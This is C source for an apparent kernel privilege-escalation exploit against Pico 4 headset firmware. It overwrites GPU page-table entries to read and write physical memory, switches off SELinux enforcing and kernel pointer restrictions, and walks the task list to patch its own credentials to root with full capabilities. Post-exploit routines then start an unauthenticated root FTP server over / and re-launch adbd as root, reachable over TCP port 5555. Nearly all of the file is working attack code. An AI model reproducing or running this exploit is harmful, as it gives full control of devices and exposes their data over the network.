#include <stdlib.h>

#include "picohaxx.h"
#include "bundle.h"
#include "term.h"
#include "offsets.h"

BUNDLE(ftpd, "ftpd");
BUNDLE(resetprop, "resetprop");
BUNDLE(magiskpolicy,"magiskpolicy");
BUNDLE(success, "audio_success");

extern struct pte_hit g_found_pte;
extern char *gsharedbuf;
extern int g_chosen_idx;
extern int g_sound;

char   ota_version[PROP_VALUE_MAX];
extern spray_slot_t *spray_ctrl;

#define FLG_MASK  0xFFF0000000000FFFULL
#define PFN_MASK  0x000FFFFFFFFFF000ULL
#define PTE_FLAGS 0x0020000000000f53ULL

#define SPINLOCK_MAX 1000000000
#define SPINLOCK(cond)                                              \
    do {                                                            \
        uint64_t _spins = 0;                                        \
        while (cond) {                                              \
            __asm__ __volatile__("yield" ::: "memory");             \
            if (++_spins >= SPINLOCK_MAX) {                         \
                log2(red("[!!!] FATAL: SPINLOCK TIMEOUT at %s:%d"), \
                    __FILE__, __LINE__);                            \
                kill_all_childs(-1);                                \
                cleanup_uaf();                                      \
                exit(1);                                            \
            }                                                       \
        }                                                           \
    } while (0)


#define kernelbase_phys 0xA0080000
#define kernelbase 0xffffff8008080000

#define KallSym2Phys(kall) ((kall - kernelbase) + kernelbase_phys)
#define KSYM2TABLE(ksym) {KallSym2Phys(ksym), #ksym}

void hexdump(void *_data, size_t byte_count, char *title, uint64_t offset)
{
    int maxlines = hexdump_endy - hexdump_starty;

    if (offset < byte_count - 0x10)
    {
        _data += offset;
    }

    for (unsigned long byte_offset = 0; byte_offset < byte_count;)
    {
        unsigned char *bytes = ((unsigned char *)_data) + byte_offset;
        unsigned long line_bytes = (byte_count - byte_offset > 16) ? 16 : (byte_count - byte_offset);

        char line[1000];
        char *linep = line;

        linep += sprintf(linep, "%08lx  ", byte_offset + offset);

        for (int i = 0; i < 16; i++) {
            if (i >= line_bytes)
            {
                linep += sprintf(linep, "   ");
            }
            else
            {
                linep += sprintf(linep, "%02hhx ", bytes[i]);
            }
        }
        linep += sprintf(linep, " |");
        for (int i = 0; i < line_bytes; i++) {
            if (isalnum(bytes[i]) || ispunct(bytes[i]) || bytes[i] == ' ')
            {
                *(linep++) = bytes[i];
            }
            else
            {
                *(linep++) = '.';
            }
        }
        linep += sprintf(linep, "|");
        log1("%s", line);
        byte_offset += 16;
        if (--maxlines == 0)
            break;
    }
    log1("=========================================");
}

uint64_t ReadWrite(uint64_t phys_address, uint64_t data, uint64_t bits, uint8_t read, char *infostr)
{
    char log_rw_a[256], log_rw[256]={0}, label[256], val[64];
    uint64_t target_pte_va = g_found_pte.gpu_va_pte;
    uint64_t pageoffset = phys_address % 4096;
    uint64_t newpte = MAKEPTE(phys_address);

    // explicit dbg overrides rw_silent
    if((infostr == RW_SILENT) && isdbg2()) infostr = 0;

    int silent = (infostr == RW_SILENT);
    if (!silent)
    {
        if (infostr)   {
            sprintf(label, bold(yellow("%s")) col(0), infostr);
        }
        else {
            label[0] = 0x21;
            label[1] = 0x00;
        }

        if (bits == 64)
            sprintf(val, "%016lX", data);
        if (bits == 32)
            sprintf(val, "%08lX", data);
        if (bits == 8)
            sprintf(val, "%02lX", data);
        if (read) {
            sprintf(log_rw_a, green("%lu-bit READ ") "at", bits);
        }
        else {
            sprintf(log_rw_a, red("%lu-bit WRITE ") "%s to", bits, val);
        }
        if(infostr) {
            switch (g_dbg) {
                case 0:
                    sprintf(log_rw, "%s " cyan("0%010lX "), log_rw_a, phys_address);
                    break;
                case 1:
                    sprintf(log_rw, "%s " cyan("0%010lX "), log_rw_a, phys_address);
                    break;
                case 2:
                    sprintf(log_rw, "%s " cyan("0%010lX ") "offs: " yellow("%04lX ") "(pte: %08lX) ", log_rw_a, phys_address, pageoffset, newpte);
                    break;
            }
        } else {
            ifdbg2 {
                sprintf(log_rw, "%s " cyan("0%010lX "), log_rw_a, phys_address);
            } else {
                log_rw[0]='-';
                log_rw[1]=0;
            }
        }
    }

    if (simulated())
    {
        spray_ctrl[g_chosen_idx].data = rand();
        goto log_result;
    }

    SPINLOCK(spray_ctrl[g_chosen_idx].do_action != 0);

    // write pte with GPU
    if (!silent)
    {
        ifdbg2 log2("gpu_write64 to pte %016lx, entry: %016lx", target_pte_va, newpte);
    }

    if (gpu_write64(target_pte_va, newpte) != 0)
    {
        if (!silent)
            log2("[-] Failed to overwrite PTE via GPU!");
        return -1;
    }

    // verify the write
    uint64_t readback = 0;
    if (gpu_read(target_pte_va, (uint32_t *)&readback, 2) != 0)
    {
        if (!silent)
            log2("[-] gpu_read failed");
        return -1;
    }

    pseudo_flushTLB();

    spray_ctrl[g_chosen_idx].address = pageoffset;
    spray_ctrl[g_chosen_idx].data = data;

    // send read command
    if (read)
    {
        if (bits == 64)
            spray_ctrl[g_chosen_idx].do_action = CMD_READ64;
        if (bits == 32)
            spray_ctrl[g_chosen_idx].do_action = CMD_READ32;
        if (bits == 8)
            spray_ctrl[g_chosen_idx].do_action = CMD_READ8;
    }
    else
    {
        if (bits == 64)
            spray_ctrl[g_chosen_idx].do_action = CMD_WRITE64;
        if (bits == 32)
            spray_ctrl[g_chosen_idx].do_action = CMD_WRITE32;
        if (bits == 8)
            spray_ctrl[g_chosen_idx].do_action = CMD_WRITE8;
    }
    SPINLOCK(spray_ctrl[g_chosen_idx].do_action != 0);

log_result:
    if (!silent)
    {
        if (read) {
            sprintf(log_rw_a, "--> " blue("%08lX"), spray_ctrl[g_chosen_idx].data);
            strcat(log_rw, log_rw_a);
        }
        log2("%s %s", log_rw, label);
    }

    if (read)
        return spray_ctrl[g_chosen_idx].data;
    return 0;
}

int read_phys_page(uint64_t phys_address, void *buffer)
{
    uint64_t target_pte_va = g_found_pte.gpu_va_pte;
    uint64_t newpte = MAKEPTE(PAGE(phys_address));

    ifdbg2 log2("read_phys_page  %016lx newpte: %016lx buffer: %016lx", phys_address, newpte, buffer);

    if (simulated())
    {
        ifdbg2 log2("sim_gpu_write64 to %016lx, pte %016lx", target_pte_va, newpte);
        for (int i = 0; i < 4096; i += 32)
            memset(buffer + i, rand(), 32);
        return 0;
    }

    // wait for peer ready
    SPINLOCK(spray_ctrl[g_chosen_idx].do_action != 0);

    // write pte with GPU
    ifdbg2 log2(" gpu_write64 to %016lx, pte %016lx", target_pte_va, newpte);
    if (gpu_write64(target_pte_va, newpte) != 0)
    {
        log2("[-] Failed to overwrite PTE via GPU!");
        return -1;
    }
    // verify the write
    uint64_t readback = 0;
    if (gpu_read(target_pte_va, (uint32_t *)&readback, 2) != 0)
    {
        log2("[-] gpu_read failed");
        return -1;
    }
    pseudo_flushTLB();

    // send read command
    spray_ctrl[g_chosen_idx].do_action = CMD_READPAGE;

    // wait for peer completion
    SPINLOCK(spray_ctrl[g_chosen_idx].do_action != 0);

    // copy if needed
    if (buffer != gsharedbuf)
    {
        memcpy(buffer, gsharedbuf, 4096);
    }
    return 0;
}

int8_t Read8(uint64_t phys_address, char *info)
{
    return ReadWrite(phys_address, 0, 8, 1, info);
}

int32_t Read32(uint64_t phys_address, char *info)
{
    return ReadWrite(phys_address, 0, 32, 1, info);
}

int64_t Read64(uint64_t phys_address, char *info)
{
    uint64_t ret = ReadWrite(phys_address, 0, 64, 1, info);
    return ret;
}

void Write8(uint64_t phys_address, uint8_t data, char *info)
{
    ReadWrite(phys_address, data, 8, 0, info);
}

void Write32(uint64_t phys_address, uint32_t data, char *info)
{
    ReadWrite(phys_address, data, 32, 0, info);
}

void Write64(uint64_t phys_address, uint64_t data, char *info)
{
    ReadWrite(phys_address, data, 64, 0, info);
}

int system_property_get_int(const char *name)
{
    char prop[256] = {0};
    __system_property_get(name, prop);
    ifdbg printf("%s: %s\n", name, prop);
    return atoi(prop);
}

char *system_property_get_string(const char *name, char *str)
{
    char prop[256] = {0};
    if (__system_property_get(name, prop) == 0)
    {
        printf(red("error reading: %s") "\n", name);
        return 0;
    }
    printf("%s: %s\n", name, prop);
    ifdbg strncpy(str, prop, 256);
    return str;
}

int read_setting(const char *ns, const char *key, char *out)
{
    char command[128], buffer[128];
    int ret=-1;
    snprintf(command, sizeof(command), "settings get %s %s", ns, key);

    FILE *fp = popen(command, "r");
    if (fp == NULL)
        return 0;

    if (fgets(buffer, sizeof(buffer), fp) == NULL)
    {
        pclose(fp);
        return 0;
    }
    strncpy(out, buffer, 128);
    ret = pclose(fp);
    if(ret == 0) {
        return 1;
    }
    return 0;
}

uint64_t find_selinux_offset_for_firmware()
{
    //==============================================================================================
    // system confirm_smartisan_version: 5.2.7-202212020445-RELEASE-user-phoenix-b2122
    //==============================================================================================
    if (!read_setting("system", "confirm_smartisan_version", ota_version))
    {
        log2(red("[-] can't read confirm_smartisan_version! Let's try our fallback.."));
        //====================================================================================================
        // alternative: ro.pvr.internal.version: c000_rf01_bv1.0.1_sv5.2.7_202212020445_phoenix_b2122_user
        // note the '_' vs '-'
        //=====================================================================================================
        if (system_property_get_string("ro.pvr.internal.version", ota_version) == 0) {
            log2(red("[-] can't read ro.pvr.internal.version, either!"));
            return 0;
        }
        // replace '_' with '-'
        for (int i = 0; ota_version[i] != '\0'; i++) {
            if (ota_version[i] == '_')
                ota_version[i] = '-';
        }
    }

    log2n(cy("[*] Device Firmware Version: %s"), ota_version);
    int i = 0;
    while(k_table[i].fw_ver != 0) {
        if (strstr(ota_version, k_table[i].fw_ver)) {
            uint64_t selinux_enforcing = k_table[i].selinux_state + 1;
            log2(green("[+] Offsets matched: %s"), k_table[i].fw_ver);
            return selinux_enforcing;
        }
        i++;
    }

    log2(red("[-] Unsupported Firmware version!"));
    return 0;
}

uint64_t kallsym_lookup(const char *sym)
{
    FILE *fp = fopen("/proc/kallsyms", "r");
    if (!fp)
    {
        log2(red("[-] Failed to open /proc/kallsyms. Is it readable?"));
        return 0;
    }

    uint64_t addr = 0;
    char type, name[256], line[512];

    while (fgets(line, sizeof(line), fp))
    {
        // parse addr, type and name
        if (sscanf(line, "%lx %c %255s", &addr, &type, name) >= 3) {
            if (strcmp(name, sym) == 0)
            {
                fclose(fp);
                if (addr == 0) log2(yellow("[!] ERROR: Symbol '%s' found, but address is 0."
                                "Verify patches to kptr_restrict, sysctl_perf_event_paranoid and selinux_enforcing."), sym);
                return addr;
            }
        }
    }

    fclose(fp);
    log2(red("[-] Symbol '%s' not found in /proc/kallsyms"), sym);
    return 0;
}

//===============================================================================
// offsets to selinux_enforcing are hardcoded for all the vulnerable builds.
// That's really all we need to get all-you-can-eat symbols via /proc/kallsyms.
// Actually we need kptr_restrict and sysctl_perf_event_paranoid as well, but
// they're are at fixed offsets across all Pico 4 Kernels.
//===============================================================================
int escalate_privs()
{
    #define FINALCOMM "IBIMS1HACK"
    prctl(PR_SET_NAME, FINALCOMM, 0, 0, 0);

    log2("[0] Starting Privilege Escalation...");
    uint64_t selinux_enforcing = find_selinux_offset_for_firmware();
    if (!selinux_enforcing)
        return -2; // FATAL

    log64(selinux_enforcing);
    Write8(KallSym2Phys(selinux_enforcing),  0, "[PATCH] selinux_enforcing");
    Write8(KallSym2Phys(0xffffff800a018ea0), 0, "[PATCH] kptr_restrict");              // /proc/sys/kernel/kptr_restrict
    Write8(KallSym2Phys(0xffffff800a00c1d4), 1, "[PATCH] sysctl_perf_event_paranoid"); // proc/sys/kernel/perf_event_paranoid
    sleepms(100);

    log2("[*] Resolving symbols...");
    uint64_t kernel_text =  kallsym_lookup("_text");
    uint64_t kva_memstart = kallsym_lookup("memstart_addr");
    uint64_t kva_init_task = kallsym_lookup("init_task");
    uint64_t kva_init_signals = kallsym_lookup("init_signals");

    if (!kernel_text || !kva_memstart || !kva_init_task || !kva_init_signals)
    {
        log2(red("[-] Symbols missing. Aborting."));
        return -2;
    }
    uint64_t kernel_slide = kernel_text - kernelbase;
    log64(kernel_text);
    log64(kernel_slide);
    log64(kva_memstart);
    log64(kva_init_task);

    //==================================================================#
    // AUTO-DETECT task_struct EPOCH via init_signals distance,
    //==================================================================#
     uint64_t task_struct_size = kva_init_signals - kva_init_task;
     uint64_t TASKS_OFFSET = 0, CRED_OFFSET = 0, COMM_OFFSET = 0;
    //==================================================================#
    // Epoch 1a layout  FW 5.2.0 - 5.6.1    EC0
    // Epoch 1b layout  FW 5.7.0 - 5.7.2    EC0
    // Epoch  2 layout  FW 5.8.0 - 5.8.2    F40
    // Epoch  3 layout  FW 5.9.0 - 5.12.2   FC0
    //==================================================================#
    switch(task_struct_size) {
        case 0xEC0:
            if(strstr(ota_version, "5.7.")) {
                log2(yellow("[+] Detected task_struct Epoch 1b Layout (FW 5.7.0 - 5.7.2)"));
                TASKS_OFFSET = 0x538; CRED_OFFSET = 0x7F0; COMM_OFFSET = 0x7F8;
            }else {
                log2(yellow("[+] Detected task_struct Epoch 1a layout (FW 5.2.0 - 5.6.1)"));
                TASKS_OFFSET = 0x530; CRED_OFFSET = 0x7E8; COMM_OFFSET = 0x7F0;
            }
             break;
        case 0xFC0:
            log2(yellow("[+] Detected task_struct Epoch 3 layout (FW 5.9 - 5.11+)"));
            TASKS_OFFSET = 0x638; CRED_OFFSET = 0x8F0; COMM_OFFSET = 0x8F8;
            break;
        case 0xF40:
            log2(yellow("[+] Detected task_struct Epoch 2 layout (FW 5.8)"));
            TASKS_OFFSET = 0x5B8; CRED_OFFSET = 0x870; COMM_OFFSET = 0x878;
            break;
        default:
            log2(blink2(red("[-] Unknown task_struct size: 0x%lx!")),task_struct_size);
            Restore_PTE();
            return -2;
    }

    #define STATIC_KVA_TO_PHYS(kva) ((kva) - kernel_text + kernelbase_phys)  // Kernel text/data
    #define HEAP_KVA_TO_PHYS(kva) (((kva) & 0x3FFFFFFFFFULL) + memstart_val) // Kernel heap

    // memstart_addr resolves heap kvas
    uint64_t memstart_val = Read64(STATIC_KVA_TO_PHYS(kva_memstart), "reading memstart_val");
    uint64_t init_task_phys = STATIC_KVA_TO_PHYS(kva_init_task);
    uint64_t current_task_phys = init_task_phys;

    //=======================================================================================
    // Now we walk the linked list of tasks, starting at init, to find our task_struct
    //=======================================================================================
    #define MAX_HIST 10000
    uint64_t hist[MAX_HIST];
    int walk_retries = 0, found = g_marathon ? -g_marathon:0;
    int depth=0, hops=0, bad_seq=0, attempts=0,loop=0;

    // Prev is always next to tasks
    uint64_t TASKS_PREV_OFFSET = TASKS_OFFSET + 8;

    log2("[4] Walking TASKS to find '%s'...", FINALCOMM);

    // this "linked list" is actually a ring. so we can take a *major* shortcut by walking backwards!
    while (true) {
        // Did we wrap around the entire list?
        if (depth > 0 && current_task_phys == init_task_phys) {
            if(g_marathon) {
                log2(green("[+] Successfully finished the lap back to init_task!"));
            } else {
                log2(red("[-] We wrapped around back to init_task without finding our target."));
            }
            if (walk_retries++ < 5 || g_marathon)
            {
                log2(yellow("[*] Let's try again..."));
                depth = 0;
                usleep(50000);
                continue;
            }
            break;
        }

        if (depth >= MAX_HIST) {
            log2(red("History limit reached. Full reset."));
            current_task_phys = init_task_phys;
            depth = 0;
            usleep(50000);
            continue;
        }
        //==================================================================================#
        // what we're trying to pull off here, is to walk a highly volatile linked list,
        // without participating in any of the locking mechanisms.
        // worse: compared to the kernel operation, we're really going in super slow-mo.
        // this is hilariously dangerous, we need to check every pointer carefully and
        // keep a history of stepped nodes, to allow stepping back. as a last resort we can
        // always go back to square one (init) we also need to detect valid looking
        // but already unlinked, task structs, that may trap us in a loop otherwise
        //==================================================================================#
        if((depth > 0) && (hist[depth-1]==current_task_phys)) {
            if(loop++ == 10) {
                log2(yellow("[*] LOOP detected. Back to init!"));
                current_task_phys = init_task_phys;
                depth = 0;
                loop=0;
                continue;
            }
        } else {
            loop = 0;
        }

        // Push current node to path
        hist[depth++] = current_task_phys;

        // Read prev pointer
        uint64_t prev_task_kva = Read64(current_task_phys + TASKS_PREV_OFFSET, isdbg2() ? "prev_task_kva" : RW_SILENT);
        uint64_t next_task_phys = 0;
        int is_bad = 0;
        hops++;

        // Check for raw pointer corruption
        if ((prev_task_kva & 0xFFFF000000000000) != 0xFFFF000000000000) {
            is_bad = 1;
        }
        else {
            // Translate KVA to Phys
            if (prev_task_kva == kva_init_task + TASKS_OFFSET) {
                next_task_phys = init_task_phys;
            }
            else {
                next_task_phys = HEAP_KVA_TO_PHYS(prev_task_kva) - TASKS_OFFSET;
            }
        }

        //  backtracking logic
        if (is_bad) {
            // pop the bad node
            depth--;
            if (depth == 0 || bad_seq > 10000)
            {
                log2(red("[!] Can't find a valid node to step to! Retrying from init_task..."));
                current_task_phys = init_task_phys;
                depth = 0;

                if(g_marathon) found--;
                if(!g_marathon) if(++attempts == 30) {
                    log2(ybr("[!] Failed task-walk attempts:%d/30. ABORTING!"),attempts);
                    return -2;
                }
                sleepms(50);
            }
            else
            {
                // step back one more to re-evaluate the parent
                depth--;
                current_task_phys = hist[depth];
                log2(yellow("[*] Dead end. Stepping back to %016lX... seq=%d"), current_task_phys, bad_seq);
                sleepms(5);
            }

            bad_seq++;
            // now retry
            continue;
        }
        else {
            bad_seq=0;
        }

        // advance to the new valid task
        current_task_phys = next_task_phys;

        // it's moi?
        char comm[64] = {0};
        ((uint64_t *)comm)[0] = Read64(current_task_phys + COMM_OFFSET,     isdbg2() ? "commLO":RW_SILENT);
        ((uint64_t *)comm)[1] = Read64(current_task_phys + COMM_OFFSET + 8, isdbg2() ? "commHI":RW_SILENT);

        if (simulated() && (depth == 5))
            strcpy(comm, FINALCOMM);

        int mod=0;
        if(g_dbg == 2)  mod=1;
        if(g_dbg == 1)  mod=5;
        if(g_dbg == 0 && g_marathon) mod=20;

        if(mod && (depth % mod) == 0) {
            log2(gbr("PREV TASK (depth %d): PHYS %016lX ") bbr("[%s]"), depth, current_task_phys, comm);
        }

        if (strncmp(comm, FINALCOMM, sizeof(comm)) == 0) {
            log2(bbr("✅ FOUND OUR TASK in %d hops at phys 0x%016lX !!"), hops, current_task_phys);
            if (++found == 1)
                break;
            log2(blink2("but actually... i think i'll go for another round!"));
            hops=0;
        }
    }

    if (found)
    {
        // Get physical address of our cred struct
        uint64_t cred_kva = Read64(current_task_phys + CRED_OFFSET, "cred_kva");
        uint64_t cred_phys = HEAP_KVA_TO_PHYS(cred_kva);

        log2(cm("[5] Patching UID and CAPS in-place."));
        //=================================================#
        // Creds layout:
        //=================================================#
        // usage      =  4 bytes
        // 8 x ids    = 32 bytes
        // securebits =  4 bytes
        // 5 x caps   = 40 bytes
        //=================================================#

        // zero out all UIDs/GIDs to become root 32 x 00
        for (int j = 4; j < 36; j += 4) {
            Write32(cred_phys + j, 0, RW_SILENT);
        }

        // Max out all capabilities 40 x 0xFF
        for (int j = 40; j < 80; j += 4) {
            Write32(cred_phys + j, 0xFFFFFFFF, RW_SILENT);
        }

        ifdbg2 {
            read_phys_page(cred_phys, gsharedbuf);
            hexdump(gsharedbuf + PAGEOFFSET(cred_phys), 0x40, "creds", 0);
        }
        log2(green("[+] Done patching, let's clean up.."));

        // restore the original PTE!
        Restore_PTE();

        // Clean up UAF properly to prevent kernel ache
        cleanup_uaf();
        diff(blink2(yellow("TOTAL")));

        postExploit(1);
        return 0;
    }
    else {
        log2(red("[-] Failed to find our task in the list."));
        Restore_PTE();
        return -1;
    }
}

uint64_t override_context(const char *a1)
{
    size_t v1;
    int fd;
    fd = open("/proc/thread-self/attr/exec", 0x80002);
    v1 = strlen(a1);
    write(fd, a1, v1 + 1);
    return close(fd);
}


int systemf(const char *__fmt, ...)
{
    va_list args;
    va_start(args, __fmt);
    int len = vsnprintf(NULL, 0, __fmt, args);
    va_end(args);
    if (len < 0)
        return -1;

    char *cmd = (char *)malloc(len + 1);
    if (cmd == NULL)
    {
        return -1;
    }

    va_start(args, __fmt);
    vsnprintf(cmd, len + 1, __fmt, args);
    va_end(args);

    int result = system(cmd);
    free(cmd);
    return result;
}

void ftpd(int port)
{
    log2(green("✓ ")"spawning " red("insecure root ftpd") " on port %d.. ", port);
    system("kill $(pidof ftpd) 2>/dev/null");
    const char *ftpd = bundle_file(ftpd);
    char aport[16];
    sprintf(aport, "%d", port);
    supaexecf("%s %d -vvwA /", ftpd, port);
}

void kill_adbd() {
    log2("restarting adbd...");
    system("pkill -9 adbd");
    exit(21);
}

int waslocked = 0;
int checkADBRoot()
{
    char state[256];
    log2(blue("%s adbd..."), waslocked ? "re-checking":"checking");
    int root = system_property_get_int("service.adb.root");
    int dbg = system_property_get_int("ro.debuggable");
    system_property_get_string("ro.boot.verifiedbootstate", state);
    system("getprop|grep -iE 'tcp.port'");

    if (root == 1 && dbg == 1)
    {
        log2n(waslocked ? blink2(green("adb root is unlocked!\n")) : green("adb root already unlocked!\n"));
        return 1;
    }
    waslocked = 1;
    log2(red("--> adb root is locked."));
    return 0;
}

void patch_ADBD()
{
    if (!checkADBRoot())
    {
        log2(yellow("patching adbd..."));
        system_resetprop(NULL, "-n", "ro.secure", "1", NULL);
        system_resetprop(NULL, "-n", "ro.debuggable", "1", NULL);
        system_resetprop(NULL, "-n", "ro.boot.verifiedbootstate", "orange", NULL);
        system_resetprop(NULL, "-n", "service.adb.root", "1", NULL);
        system_magiskpolicy(NULL, "--live", "allow adbd adbd process setcurrent", "allow adbd su process dyntransition", "permissive { su }", NULL);
        sleepms(1000);
        log2("setting persist.adb.tcp.port to 5555...");
        system("setprop persist.adb.tcp.port 5555");
        checkADBRoot();
        log2("\n%s\n\n", boxit(cb("NOTE: I just patched and restarted adbd with root permissions."),
                         cb("      Just reconnect to enjoy your root shell! The regular adb"),
                         cb(" 🔥   root/unroot command will be available until reboot as well."), NULL));
        kill_adbd();
    }
}

int unroot()
{
    checkADBRoot();
    log2(yellow("unrooting adbd..."));
    system_resetprop(NULL, "-n", "ro.debuggable", "0", NULL);
    system_resetprop(NULL, "-n", "ro.boot.verifiedbootstate", "green", NULL);
    system_resetprop(NULL, "-n", "service.adb.root", "0", NULL);
    system_magiskpolicy(NULL, "--live", "deny adbd adbd process setcurrent", "deny adbd su process dyntransition", "enforce { su }", 0);
    system("set -x;setenforce 1;pkill -9 adbd");
    log2(green("done."));
    return 0;
}

void postExploit(int first)
{
    log2(ybr("running post exploit tasks.."));
    if(first & isRoot()) PLAY_SOUND_BG(success);
    override_context("u:r:su:s0");

    if(g_unroot) {
        unroot();
        exit(0);
    }

    if(g_ftpd) ftpd(21);
    if(g_adbd) patch_ADBD();
    restore_terminal();

    if(g_custom_spawn_args) {
        char **args = g_custom_spawn_args;
        char **p = args;
        log2(yellow("[+] execve argv[]:"));
        while (*p) log2("%s ", *p++);
        int r=execvp(args[0], args);
        log2(red("[-] execvp returned: %d "), r);
        return;
    }
}
